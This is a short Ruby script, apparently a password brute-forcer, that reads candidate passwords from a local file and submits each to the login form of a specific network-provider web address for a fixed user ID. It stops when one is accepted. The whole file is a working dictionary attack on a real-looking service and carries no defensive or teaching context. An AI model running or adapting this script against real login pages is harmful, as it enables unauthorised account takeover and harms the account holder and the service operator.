# encoding: ASCII-8BIT
require 'net/http'
require 'uri'

def wrong_pass? password
	uri = URI.parse 'http://wifilan.lg.ua:8088/'
	response = Net::HTTP.post_form(uri, :ulogin => "146", :upassword => password).body
	response.include? "146"
end





input = File.open "Password.txt", "r" 
	
while (line = input.gets)
		line.strip!
		print "password: ...#{line}..."
		if wrong_pass? line
			puts "Error"
			
		else
			puts "It's OK"
			
			input.close
			exit
		end
		
end

